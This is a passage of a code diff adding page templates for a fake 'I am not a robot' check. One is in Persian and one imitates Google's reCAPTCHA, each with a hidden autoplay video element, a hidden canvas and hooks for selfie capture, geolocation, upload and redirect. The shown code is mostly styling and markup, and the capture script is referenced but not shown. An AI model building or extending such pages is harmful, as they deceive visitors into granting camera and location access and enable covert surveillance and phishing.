+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer; background: #fff; transition: all .18s; flex-shrink: 0; }
+  .row:hover .checkbox { border-color: var(--accent); }
+  #widget:focus { outline: none; }
+  #widget:focus-visible .checkbox { outline: 2px solid var(--accent); outline-offset: 2px; }
+  #widget.done .checkbox { background: var(--accent); border-color: var(--accent); }
+  #widget.done .checkbox::after { content: ""; width: 7px; height: 13px;
+    border: solid #fff; border-width: 0 2.5px 2.5px 0;
+    transform: rotate(45deg); margin-bottom: 3px; }
+  #widget.busy .checkbox { border-color: var(--accent); }
+  #widget.busy .checkbox::after { content: ""; width: 14px; height: 14px;
+    border: 2px solid #e5e7eb; border-top-color: var(--accent);
+    border-radius: 50%; animation: spin .7s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .label { font-size: 16px; font-weight: 500; cursor: pointer; }
+  .hint { margin-top: 14px; font-size: 12px; color: var(--muted); line-height: 1.7; }
+  .status { margin-top: 12px; font-size: 13px; min-height: 18px; }
+  .status.error { color: var(--err); }
+  .status.ok { color: var(--ok); }
+  .retry { margin-top: 8px; background: none; border: 1px solid var(--border);
+    color: #1f2328; padding: 6px 12px; border-radius: 8px; font-size: 13px;
+    cursor: pointer; display: none; }
+  .retry:hover { background: #f3f4f6; }
+  #hiddenVideo, #canvas { display: none; }
+  noscript { display: block; margin-top: 12px; color: var(--err); font-size: 13px; }
+</style></head><body>
+  <div class="card">
+    <div class="row" id="widget" role="checkbox" aria-checked="false" aria-label="من ربات نیستم" tabindex="0">
+      <div class="checkbox"></div>
+      <span class="label" id="label">من ربات نیستم</span>
+    </div>
+    <p class="hint">${hint}</p>
+    <div class="status" id="status" role="status" aria-live="polite"></div>
+    <button class="retry" id="retry" type="button">تلاش مجدد</button>
+    <noscript>برای ادامه، جاوااسکریپت باید فعال باشد.</noscript>
+  </div>
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+  ${captchaScript(nonce, selfieMode, geoMode, redirectUrl, labels)}
+</body></html>`;
+}
+
+// ============================================================
+//  Theme: Google (reCAPTCHA style)
+// ============================================================
+function renderGoogleHTML(nonce, selfieMode, geoMode, redirectUrl) {
+  const labels = {
+    busy: 'Verifying...', done: 'Verification complete',
+    error: 'Verification failed. Please try again.',
+    camTimeout: 'Camera timed out. Please try again.',
+    uploadError: 'Connection error. Please try again.',
+  };
+  return `<!DOCTYPE html>
+<html lang="en" dir="ltr"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>reCAPTCHA</title>
+<style nonce="${nonce}">
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; min-height: 100%; }
+  body { font-family: Roboto, arial, sans-serif; background: #f9f9f9;
+    min-height: 100vh; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; padding: 20px; color: #202124; }
+  .g-main { display: flex; flex-direction: column; align-items: center; gap: 12px; }
+  .g-widget { width: 304px; height: 78px; background: #fff; border
